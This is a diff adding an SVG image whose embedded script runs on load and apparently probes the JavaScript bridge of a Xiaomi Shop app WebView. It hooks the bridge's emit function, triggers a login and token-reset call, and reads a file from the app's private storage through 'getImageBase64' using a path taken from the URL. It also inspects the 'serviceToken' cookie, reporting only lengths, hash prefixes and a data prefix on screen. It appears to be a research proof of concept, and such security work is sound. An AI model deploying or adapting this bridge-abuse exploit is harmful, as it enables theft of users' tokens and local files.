@@ -1,0 +1,158 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="2200" height="1600">
+  <rect width="100%" height="100%" fill="white"/>
+  <text id="summary" x="24" y="48" font-family="monospace" font-size="24" fill="black">PROBE_RESULT:status=starting</text>
+  <text id="log" x="24" y="100" font-family="monospace" font-size="22" fill="black">probe_start</text>
+  <script><![CDATA[
+(function () {
+  const summary = document.getElementById('summary');
+  const logNode = document.getElementById('log');
+  const params = new URLSearchParams(location.search || '');
+  const markerPath = params.get('marker_path') || '/data/data/com.xiaomi.shop/files/redsec_marker.jpg';
+  const state = {
+    hasWE: false,
+    hasTrigger: false,
+    login_called: false,
+    cookie_present: false,
+    cookie_len: 0,
+    cookie_name: '',
+    cookie_sha16: '',
+    file_called: false,
+    file_emit_code: '',
+    file_data_len: 0,
+    file_data_prefix: '',
+    file_data_sha16: '',
+    errors: ''
+  };
+  const logLines = [];
+
+  function addError(label, value) {
+    const msg = label + ':' + String(value && value.message || value || 'error').replace(/[|=\r\n]/g, '_').slice(0, 80);
+    state.errors = state.errors ? state.errors + ',' + msg : msg;
+  }
+  function setLog(line) {
+    logLines.push(String(line).slice(0, 180));
+    while (logNode.firstChild) logNode.removeChild(logNode.firstChild);
+    let y = 100;
+    logLines.slice(-24).forEach(function (entry) {
+      const t = document.createElementNS('http://www.w3.org/2000/svg', 'tspan');
+      t.setAttribute('x', '24');
+      t.setAttribute('y', String(y));
+      t.textContent = entry;
+      logNode.appendChild(t);
+      y += 34;
+    });
+  }
+  function hex(buf) {
+    return Array.from(new Uint8Array(buf)).map(function (b) { return b.toString(16).padStart(2, '0'); }).join('');
+  }
+  async function digest16(value) {
+    try {
+      const data = new TextEncoder().encode(String(value || ''));
+      const hash = await crypto.subtle.digest('SHA-256', data);
+      return hex(hash).slice(0, 16);
+    } catch (e) {
+      return 'sha_unavailable';
+    }
+  }
+  function render() {
+    const order = [
+      'hasWE', 'hasTrigger', 'login_called', 'cookie_present', 'cookie_len',
+      'cookie_name', 'cookie_sha16', 'file_called', 'file_emit_code',
+      'file_data_len', 'file_data_prefix', 'file_data_sha16', 'errors'
+    ];
+    summary.textContent = 'PROBE_RESULT:' + order.map(function (k) {
+      return k + '=' + String(state[k]).replace(/[|=\r\n]/g, '_');
+    }).join('|');
+  }
+  async function summarizeCookie() {
+    try {
+      const raw = document.cookie || '';
+      let token = '';
+      raw.split(';').forEach(function (part) {
+        const trimmed = part.trim();
+        const idx = trimmed.indexOf('=');
+        if (idx > 0 && trimmed.slice(0, idx) === 'serviceToken') {
+          token = trimmed.slice(idx + 1);
+        }
+      });
+      state.cookie_present = !!token;
+      state.cookie_name = token ? 'serviceToken' : '';
+      state.cookie_len = token.length;
+      state.cookie_sha16 = token ? await digest16(token) : '';
+      render();
+    } catch (e) {
+      addError('cookie', e);
+      render();
+    }
+  }
+  function hookEmit() {
+    if (!window.WE) return;
+    const oldEmit = window.WE.emit;
+    window.WE.emit = function (event, payload, id) {
+      try {
+        if (String(event) === 'getImageBase64') {
+          const parsed = JSON.parse(String(payload || '{}'));
+          const data = String(parsed.data || '');
+          state.file_emit_code = parsed.code;
+          state.file_data_len = data.length;
+          state.file_data_prefix = data.slice(0, 10);
+          digest16(data).then(function (h) {
+            state.file_data_sha16 = h;
+            render();
+          });
+          setLog('emit getImageBase64 id=' + id + ' code=' + parsed.code + ' data_len=' + data.length);
+          render();
+        }
+      } catch (e) {
+        addError('emit', e);
+        render();
+      }
+      if (typeof oldEmit === 'function') {
+        try { return oldEmit.apply(this, arguments); } catch (e2) {}
+      }
+    };
+  }
+  function callLogin() {
+    try {
+      const payload = JSON.stringify({ sid: 'eshopmobile', domain: location.hostname, callback: 'bridgeProbeCallback' });
+      const ret = WE.trigger('login_and_reset_token', payload, 'bridge_probe_token');
+      state.login_called = !!ret || ret === undefined;
+      setLog('login_and_reset_token called');
+    } catch (e) {
+      addError('login', e);
+    }
+    render();
+  }
+  function callFileRead() {
+    try {
+      const ret = WE.trigger('getImageBase64', markerPath, 'bridge_probe_file');
+      state.file_called = !!ret || ret === undefined;
+      setLog('getImageBase64 called path=' + markerPath);
+    } catch (e) {
+      addError('file', e);
+    }
+    render();
+  }
+  function run() {
+    state.hasWE = !!window.WE;
+    state.hasTrigger = !!(window.WE && typeof WE.trigger === 'function');
+    setLog('href=' + location.href);
+    setLog('host=' + location.hostname);
+    setLog('hasWE=' + state.hasWE + ' hasTrigger=' + state.hasTrigger);
+    render();
+    if (!state.hasTrigger) {
+      summarizeCookie();
+      return;
+    }
+    hookEmit();
+    summarizeCookie();
+    callLogin();
+    setTimeout(summarizeCookie, 1500);
+    setTimeout(summarizeCookie, 3500);
+    setTimeout(callFileRead, 2200);
+    setTimeout(summarizeCookie, 7000);
+  }
+  setTimeout(run, 800);
+})();
+  ]]></script>
+</svg>
